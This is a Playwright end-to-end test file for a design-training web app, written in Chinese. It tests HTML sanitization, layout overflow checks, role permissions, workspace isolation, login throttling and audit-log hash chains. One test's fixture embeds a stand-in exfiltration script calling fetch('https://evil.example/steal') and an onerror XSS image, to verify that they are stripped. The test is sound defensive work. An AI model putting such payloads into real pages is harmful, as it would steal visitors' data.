import { PrismaClient } from "@prisma/client";
import { expect, test } from "@playwright/test";
import { CASE_METADATA, expectStatus, IDS, newSession, readJson, SAFE_HTML, SCREENSHOT_DATA_URL, scores } from "./helpers";
import { hashObject } from "../../src/lib/hash";
import { loginThrottleTargets } from "../../src/lib/login-guard";

const prisma = new PrismaClient();

test.afterAll(async () => {
  await prisma.$disconnect();
});

test("安全边界：恶意 HTML 不执行，375px 溢出被阻断", async () => {
  const engineer = await newSession("engineer@example.test");
  try {
    const maliciousHtml = "<!doctype html><html><head><script>fetch('https://evil.example/steal')</script></head><body><h1>恶意样例</h1><p>这段正文用于触发安全 HTML 检查，包含脚本和远程请求，不应进入盲测。</p><img src='https://evil.example/track.png' onerror='alert(1)'></body></html>";
    const malicious = await engineer.post("/api/v1/candidates", { data: {
      title: "E2E 恶意 HTML", briefId: IDS.brief, modelProvider: "demo", modelName: "unsafe", modelVersion: "1",
      html: maliciousHtml, screenshotDataUrl: SCREENSHOT_DATA_URL,
    }});
    expectStatus(malicious, 201);
    const maliciousId = (await readJson<{ id: string }>(malicious)).id;
    const result = await readJson<any>(await engineer.post("/api/v1/candidates/" + maliciousId + "/hard-check", { data: {} }));
    expect(result.ok).toBe(false);
    const security = result.checks.find((row: any) => row.ruleId === "HC-03");
    expect(security.status).toBe("FAIL");
    expect(security.message).toContain("安全 HTML");

    const detail = await readJson<any>(await engineer.get("/api/v1/candidates/" + maliciousId));
    const htmlAsset = detail.assets.find((asset: any) => asset.kind === "HTML");
    const preview = await engineer.get("/api/v1/files/" + htmlAsset.storedFileId + "/content");
    expectStatus(preview, 200);
    const previewText = await preview.text();
    expect(previewText).not.toContain("<script");
    expect(previewText).not.toContain("evil.example");
    expect(preview.headers()["content-security-policy"]).toContain("script-src 'none'");

    const overflowHtml = "<!doctype html><html><body style='margin:0;color:#111;background:#fff'><h1>溢出样例</h1><p>这段正文足够长，用于验证 375px 硬检查能够识别横向溢出。</p><div style='width:900px'>固定宽度版块</div></body></html>";
    const overflow = await engineer.post("/api/v1/candidates", { data: {
      title: "E2E 375px 溢出", briefId: IDS.brief, modelProvider: "demo", modelName: "overflow", modelVersion: "1",
      html: overflowHtml, screenshotDataUrl: SCREENSHOT_DATA_URL,
    }});
    expectStatus(overflow, 201);
    const overflowId = (await readJson<{ id: string }>(overflow)).id;
    const overflowResult = await readJson<any>(await engineer.post("/api/v1/candidates/" + overflowId + "/hard-check", { data: {} }));
    expect(overflowResult.ok).toBe(false);
    const layout = overflowResult.checks.find((row: any) => row.ruleId === "HC-04");
    expect(layout.status).toBe("FAIL");
    expect(layout.message).toContain("375px");
  } finally {
    await engineer.dispose();
  }
});

test("权限：Viewer 不能读审计、导出或查看未入库案例", async () => {
  const viewer = await newSession("viewer@example.test");
  const owner = await newSession("owner@example.test");
  try {
    expectStatus(await viewer.get("/api/v1/audit-logs"), 403);
    expectStatus(await viewer.get("/api/v1/cases/00000000-0000-4000-8000-000000000304"), 404);
    expectStatus(await viewer.get("/api/v1/cases/" + IDS.eligibleCase), 200);
    const datasets = await readJson<Array<any>>(await owner.get("/api/v1/datasets"));
    expectStatus(await viewer.post("/api/v1/datasets/" + datasets[0].id + "/export", { data: {} }), 403);
  } finally {
    await Promise.all([viewer.dispose(), owner.dispose()]);
  }
});

test("隔离：其他 Workspace 的 Brief 对当前用户返回 404", async () => {
  const owner = await newSession("owner@example.test");
  let workspaceId: string | null = null;
  try {
    const otherWorkspace = await prisma.workspace.create({ data: { name: "E2E 隔离 Workspace", slug: "e2e-isolation-" + Date.now() } });
    workspaceId = otherWorkspace.id;
    const brief = await prisma.brief.create({ data: { workspaceId: otherWorkspace.id, briefNo: "BR-E2E", title: "其他工作区内容", ownerId: IDS.owner } });
    await prisma.briefVersion.create({ data: {
      briefId: brief.id, version: 1, manuscriptMarkdown: "其他 Workspace 的敏感正文", targetAudience: "内部",
      designCommission: "隔离测试", brandRequirements: "隔离测试", prohibitedItems: "不可见",
      contentHash: "e2e-isolation", createdBy: IDS.owner,
    }});
    expectStatus(await owner.get("/api/v1/briefs/" + brief.id), 404);
  } finally {
    if (workspaceId) await prisma.workspace.delete({ where: { id: workspaceId } });
    await owner.dispose();
  }
});

test("UI：登录后查看 375px 截图与 sandbox HTML 预览", async ({ page }) => {
  await page.goto("/login");
  await page.locator("input[type=email]").fill("owner@example.test");
  await page.locator("input[type=password]").fill("Demo1234!");
  await page.getByRole("button", { name: /登录/ }).click();
  await expect(page).toHaveURL(/\/dashboard/);
  await expect(page.getByRole("heading", { name: "设计训练工作台" })).toBeVisible();
  await page.goto("/cases/" + IDS.eligibleCase);
  const frame = page.locator("iframe[title*='HTML']").first();
  await expect(frame).toHaveAttribute("sandbox", "");
  const screenshot = page.locator("img.preview-image").first();
  await expect(screenshot).toBeVisible();
  await expect.poll(async () => screenshot.evaluate((image: HTMLImageElement) => image.naturalWidth)).toBe(375);
});

test("Holdout：普通角色无法通过 ID 读取数据集或截图文件", async () => {
  const owner = await newSession("owner@example.test");
  const lead = await newSession("lead@example.test");
  const viewer = await newSession("viewer@example.test");
  const engineer = await newSession("engineer@example.test");
  try {
    expectStatus(await lead.get("/api/v1/briefs/" + IDS.holdoutBrief), 404);
    expectStatus(await viewer.get("/api/v1/briefs/" + IDS.holdoutBrief), 404);
    expectStatus(await owner.get("/api/v1/briefs/" + IDS.holdoutBrief), 200);

    const holdoutCase = await owner.post("/api/v1/cases", { data: {
      title: "E2E Holdout 案例 " + Date.now(), briefId: IDS.holdoutBrief,
      applicableConditions: "仅用于保留集评测。", designMechanism: "以夜景分层建立阅读路径。",
      ...CASE_METADATA,
      antiPatterns: [], mechanismTags: ["场景分层"], selfScores: scores(4), sourceType: "INTERNAL_ORIGINAL",
      sourceNote: "E2E 非敏感 Holdout 样例", html: SAFE_HTML, screenshotDataUrl: SCREENSHOT_DATA_URL,
    }});
    expectStatus(holdoutCase, 201);
    const holdoutCaseId = (await readJson<{ id: string }>(holdoutCase)).id;
    const holdoutDetail = await readJson<any>(await owner.get("/api/v1/cases/" + holdoutCaseId));
    const screenshotFileId = holdoutDetail.assets.find((asset: any) => asset.kind === "SCREENSHOT_375").storedFileId;
    expectStatus(await lead.get("/api/v1/files/" + screenshotFileId + "/content"), 404);
    expectStatus(await viewer.get("/api/v1/files/" + screenshotFileId + "/content"), 404);
    expectStatus(await owner.get("/api/v1/files/" + screenshotFileId + "/content"), 200);

    expectStatus(await engineer.post("/api/v1/candidates", { data: {
      title: "不应创建的 Holdout 候选", briefId: IDS.holdoutBrief, modelProvider: "demo", modelName: "holdout", modelVersion: "1",
      html: SAFE_HTML, screenshotDataUrl: SCREENSHOT_DATA_URL,
    }}), 404);
    expectStatus(await lead.post("/api/v1/datasets", { data: {
      name: "不应创建的 Holdout 数据集", type: "EVAL", briefIds: [IDS.holdoutBrief],
      caseIds: [], counterexampleIds: [], candidateIds: [],
    }}), 404);

    const created = await owner.post("/api/v1/datasets", { data: {
      name: "E2E Holdout 数据集 " + Date.now(), type: "EVAL", briefIds: [IDS.holdoutBrief],
      caseIds: [], counterexampleIds: [], candidateIds: [],
    }});
    expectStatus(created, 201);
    const datasetId = (await readJson<{ id: string }>(created)).id;
    const visibleToViewer = await readJson<Array<any>>(await viewer.get("/api/v1/datasets"));
    expect(visibleToViewer.some((dataset) => dataset.id === datasetId)).toBe(false);
    expectStatus(await lead.get("/api/v1/datasets/" + datasetId), 404);
    expectStatus(await viewer.get("/api/v1/datasets/" + datasetId), 404);
    expectStatus(await owner.get("/api/v1/datasets/" + datasetId), 200);
  } finally {
    await Promise.all([owner.dispose(), lead.dispose(), viewer.dispose(), engineer.dispose()]);
  }
});

test("登录节流：连续失败后阻断同一账号继续尝试", async ({ request }) => {
  const email = "login-throttle-" + Date.now() + "@example.test";
  try {
    for (let attempt = 0; attempt < 8; attempt += 1) {
      const response = await request.post("/api/v1/auth/login", { data: { email, password: "WrongPassword!" } });
      expectStatus(response, 401);
    }
    const blocked = await request.post("/api/v1/auth/login", { data: { email, password: "WrongPassword!" } });
    expectStatus(blocked, 429);
    expect((await blocked.json()).error.code).toBe("RATE_LIMITED");
  } finally {
    const accountKey = loginThrottleTargets(email)[0].key;
    await prisma.authThrottle.deleteMany({ where: { key: accountKey } });
  }
});

test("审计链：entryHash 可由数据库记录独立复算", async () => {
  const logs = await prisma.auditLog.findMany({ where: { workspaceId: IDS.workspace }, orderBy: { id: "asc" } });
  expect(logs.length).toBeGreaterThan(0);
  let prevHash: string | null = null;
  for (const log of logs) {
    const payload = {
      workspaceId: log.workspaceId,
      actorId: log.actorId,
      actorType: log.actorType,
      action: log.action,
      resourceType: log.resourceType,
      resourceId: log.resourceId,
      before: log.before,
      after: log.after,
      reason: log.reason,
      requestId: log.requestId,
      ip: log.ip,
      userAgent: log.userAgent,
      occurredAt: log.occurredAt.toISOString(),
    };
    expect(log.prevHash).toBe(prevHash);
    expect(log.entryHash).toBe(hashObject({ payload, prevHash }));
    prevHash = log.entryHash;
  }
});

